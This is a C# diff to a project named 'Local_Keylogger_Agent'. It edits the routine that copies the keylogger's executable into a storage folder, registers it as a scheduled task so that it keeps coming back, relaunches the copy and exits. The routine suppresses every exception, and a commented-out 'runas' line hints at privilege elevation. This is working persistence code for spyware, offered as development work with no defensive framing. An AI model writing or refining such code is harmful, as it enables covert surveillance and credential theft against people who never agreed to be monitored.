@@ -14,16 +14,18 @@ namespace Local_Keylogger_Agent
                 string fileName = Path.GetFileName(exePath);
                 string destinationPath = Path.Combine(Storage.KeyLogerCopyPath, fileName);
 
-                if(!File.Exists(destinationPath))
+                if (!File.Exists(destinationPath))
                 {
                     File.Copy(exePath, destinationPath, true); // Copy the executable to the target directory
                 }
+                else
+                    return; // If the file already exists, do nothing
 
                 taskName = Path.GetFileNameWithoutExtension(fileName);
 
                 RegisterScheduledTask(destinationPath);
             }
-            catch (Exception ex)
+            catch (Exception)
             {
                 //Ignore any exceptions that occur during the copy or task registration
             }
@@ -46,8 +48,23 @@ namespace Local_Keylogger_Agent
             Process process = Process.Start(psi);
             process?.WaitForExit();
 
-            Process.Start(exeFilePath);
-            Application.Exit();
+            try
+            {
+                var psi2 = new ProcessStartInfo
+                {
+                    FileName = exeFilePath,
+                    UseShellExecute = false,
+                    //Verb = "runas",
+                };
+
+
+                Process.Start(psi2);
+                Application.Exit();
+            }
+            catch (Exception)
+            {
+                //Ignore any exceptions that occur during the start of the new process
+            }
         }
     }
 }
